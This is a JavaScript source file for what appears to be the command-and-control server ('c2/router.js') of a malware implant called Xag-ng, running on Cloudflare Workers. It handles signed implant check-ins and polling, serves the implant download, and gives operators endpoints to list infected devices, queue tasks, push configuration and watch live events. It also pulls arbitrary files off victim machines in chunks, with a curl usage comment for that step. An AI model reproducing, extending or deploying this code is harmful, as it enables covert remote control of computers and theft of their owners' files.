/* Xag-ng :: c2/router.js — routing, auth, live channels, chunked pull */
export function device(env, uid) { return env.DEVICE.get(env.DEVICE.idFromName(uid)); }

    export async function call(stub, path, body) {
      const r = await stub.fetch('https://do' + path, { method: 'POST', body: body === undefined ? undefined : JSON.stringify(body) });
      return r.json();
    }
    export function raw(stub, path, body) {
      return stub.fetch('https://do' + path, { method: 'POST', body: body === undefined ? undefined : JSON.stringify(body) });
    }

    const enc = new TextEncoder();

    async function hmac(key, msg) {
      const k = await crypto.subtle.importKey('raw', enc.encode(key), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
      const s = await crypto.subtle.sign('HMAC', k, enc.encode(msg));
      return [...new Uint8Array(s)].map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function eq(a, b) {
      if (typeof a !== 'string' || typeof b !== 'string' || a.length !== b.length) return false;
      let d = 0; for (let i = 0; i < a.length; i++) d |= a.charCodeAt(i) ^ b.charCodeAt(i);
      return d === 0;
    }
    function unb64(s) {
      const b = atob(s), u = new Uint8Array(b.length);
      for (let i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
      return u;
    }

    /* Implant side: HMAC over uid:ts:body, 5 minute replay window. */
    async function verified(env, request, rawBody) {
      if (!env.XG_KEY) return true;
      const uid = request.headers.get('x-xg-uid');
      const ts = request.headers.get('x-xg-ts');
      const sig = request.headers.get('x-xg-sig');
      if (!uid || !ts || !sig) return false;
      if (Math.abs(Date.now() - Number(ts)) > 300000) return false;
      return eq(await hmac(env.XG_KEY, uid + ':' + ts + ':' + rawBody), sig);
    }
    /* Operator side: bearer, or ?token= for EventSource which cannot set headers. */
    function admin(env, request, url) {
      if (!env.XG_ADMIN) return true;
      const h = request.headers.get('authorization') || '';
      if (eq(h, 'Bearer ' + env.XG_ADMIN)) return true;
      return eq(url.searchParams.get('token') || '', env.XG_ADMIN);
    }

    export async function handle(request, env) {
      const url = new URL(request.url), path = url.pathname;
      if (path === '/health') return json({ ok: true, env: env.XG_ENV, t: Date.now() });
      const api = path.startsWith('/up') || path.startsWith('/poll') || path.startsWith('/admin');
      if (!api && env.ASSETS) return env.ASSETS.fetch(request);   // also serves /dl/xgd and /console.html

      const uid = request.headers.get('x-xg-uid') || url.searchParams.get('uid');
      if (!uid) return json({ ok: false, err: 'no uid' }, 400);
      const stub = device(env, uid);

      /* ---------------- implant channels ---------------- */
      if (path === '/up' || path === '/poll') {
        const rawBody = await request.text();
        if (!(await verified(env, request, rawBody))) return json({ ok: false, err: 'bad sig' }, 401);
        let b = {};
        try { b = JSON.parse(rawBody || '{}'); } catch (e) {}
        if (path === '/up') {
          if (b.results) await call(stub, '/result', { results: b.results });
          return json(await call(stub, '/ingest', {
            uid, boot: url.searchParams.get('boot') === '1', batch: b.batch || [], meta: b.meta
          }));
        }
        return json(await call(stub, '/poll', { depth: b.depth || 0, wait: b.wait || 0 }));
      }

      /* ---------------- operator side ---------------- */
      if (!admin(env, request, url)) return json({ ok: false, err: 'unauth' }, 401);

      if (path === '/admin/list') {
        const r = await (await env.REGISTRY.get(env.REGISTRY.idFromName('root'))).fetch('https://do/list');
        return json(await r.json());
      }

      if (path === '/admin/state') return json(await call(stub, '/state', undefined));

      if (path === '/admin/events')
        return json(await call(stub, '/events', undefined) || {});

      if (path === '/admin/log') {
        const r = await call(stub, '/log', undefined);
        const id = url.searchParams.get('id');
        const rows = (r && r.rows) || [];
        return json(id ? { ok: true, rows: rows.filter(x => x.id === id || (x.body && x.body.id === id)) } : r);
      }

      if (path === '/admin/task') { const t = await request.json(); return json(await call(stub, '/enqueue', t)); }
      if (path === '/admin/cfg') { const t = await request.json(); return json(await call(stub, '/cfg', t.cfg || {})); }

      /* live SSE — straight pass-through of the DO stream */
      if (path === '/admin/live') {
        const since = url.searchParams.get('since') || 0;
        return raw(stub, '/live?since=' + since, {});
      }

      /* server-side chunked pull: curl -o file '.../admin/dl?uid=X&path=/...' */
      if (path === '/admin/dl') {
        const file = url.searchParams.get('path');
        if (!file) return json({ ok: false, err: 'no path' }, 400);
        const chunk = Math.min(Number(url.searchParams.get('chunk') || 262144), 1048576);
        const name = file.split('/').pop() || 'file';
        let off = Number(url.searchParams.get('off') || 0);
        const limit = Number(url.searchParams.get('len') || 0);

        const stream = new ReadableStream({
          async start(ctrl) {
            try {
              for (;;) {
                const want = limit ? Math.min(chunk, limit - off) : chunk;
                if (want <= 0) break;
                const r = await call(stub, '/rpc', { op: 'fs.read', args: { path: file, off, len: want }, timeout: 45000 });
                if (!r || !r.ok) { ctrl.error(new Error((r && r.err) || 'read failed')); return; }
                const v = r.result;
                if (!v) { ctrl.error(new Error('no such file: ' + file)); return; }
                ctrl.enqueue(v.enc === 'text' ? enc.encode(v.data) : unb64(v.data));
                off += v.got;
                if (v.eof || !v.got) break;
              }
              ctrl.close();
            } catch (e) { ctrl.error(e); }
          }
        });
        return new Response(stream, { headers: {
          'content-type': 'application/octet-stream',
          'content-disposition': 'attachment; filename="' + name + '"',
          'cache-control': 'no-store'
        }});
      }

      return json({ ok: false, err: 'not found' }, 404);
    }

    function json(o, s = 200) {
      return new Response(JSON.stringify(o), { status: s, headers: { 'content-type': 'application/json', 'cache-control': 'no-store' } });
    }
    